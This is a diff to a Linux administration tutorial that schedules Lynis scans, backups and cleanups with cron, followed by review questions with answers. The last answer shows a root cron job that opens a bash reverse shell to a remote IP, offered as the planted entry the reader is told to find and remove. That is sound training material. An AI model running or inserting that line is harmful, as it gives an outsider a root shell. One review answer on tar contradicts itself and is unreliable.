@@ -143,7 +143,88 @@ rm -rf /root/.cache/thumbnails
 ```
 
 ## Scheduling Backups, Cleanups, and Security Checks
+We also want to run Lynis on a regular basis and record the report in a log.\
+lynis.system.sh
+```console
+#!/bin/bash 
+lynis audit system >> /tmp/lynis.system_scan.log
+```
+lynis.partial.sh
+```console
+export TestGroup=('malware' 'authentication' 'networking' 
+'storage' 'filesystems');  
+for TG in ${TestGroup[@]};  
+do sudo lynis audit system --tests-from-group $TG >> 
+/tmp/lynis.partial_scan.log;  
+done
+```
+```console
+chmod +x lynis.system.sh
+chmod +x lynis.partial.sh
+sudo crontab -e
+```
+We will add the following to the bottom of the crontab:\
+@weekly lynis.system.sh \
+@daily lynis.partial.sh
 
-
+We want to add our scripts to the system wide cron directories to schedule our scripts. We will do the following:
+```console
+cd ~/Security_scripts 
+sudo cp backup.sh /etc/cron.weekly 
+sudo cp update.sh /etc/cron.weekly
+sduo cp cleanup.sh /etc/cron.daily
+sudo cp lynis.system.sh /etc/cron.weekly 
+sudo cp lynis.partial.sh /etc/cron.daily
+```
 
 ## Reviewing
+When will the following cron schedules run? 
+*/10 * * * * <br>
+■ Solution: At every 10th minute. 
+
+What event is the following cron a minute away from? 
+59 23 31 12 * <br>
+■ Solution: New Years! 
+
+What do the following hypothetical cron likely do? 
+0 18 * * 1-5 /home/Bob/Sales/sum_of_sales.sh <br>
+■ Solution: Run a script that adds up all the sales for the work day. 
+
+@weekly /home/sysadmin/Scripts/auto-update.sh <br>
+■ Solution: A weekly automated system update. 
+
+What is a shebang? <br>
+■ Solution: It is the commented file declaration at the top of a shell script. 
+
+What two characters should come before the filename of a script? <br>
+■ Solution: ./ 
+
+Jane's script has "user" and "group" ownership of a script with -rw-r--r-- 
+permissions, but she cannot get it to run. What must she do to the file before it will
+run? <br>
+■ Solution: Run chmod +x on her file! 
+
+How does the -x option modify the tar command? <br>
+■ Solution: This option will let tar extract an archive!
+If a directory has ten files and the following command is used in it, how many files
+are being archived? 
+
+tar cvvWf backups/archive.tar <br>
+■ Solution: Zero, because tar doesn’t compress! But all files should be
+archived as they're all in the current directory! 
+
+What option prints the full file specification of files as you interact with them? <br>
+■ Solution: -vv 
+
+Why is the -f option used in almost every tar operation? <br>
+■ Solution: The -f option lets you designate a tar file to either "create" or
+"extract" or "list" from. 
+
+You are tasked to look through the cron jobs within your current workstation to see
+if any suspicious or modified cronjobs exist. Remove the one that matches the following
+descriptions: Cron is running system-level jobs with root privileges. The cron task you're
+looking for involves another machine. <br>
+■ Solution: <br>
+Run sudo crontab -e to open the root crontab. <br>
+The cron you wanted to remove was: <br>
+*/2 * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.188.164/888 0>&1 
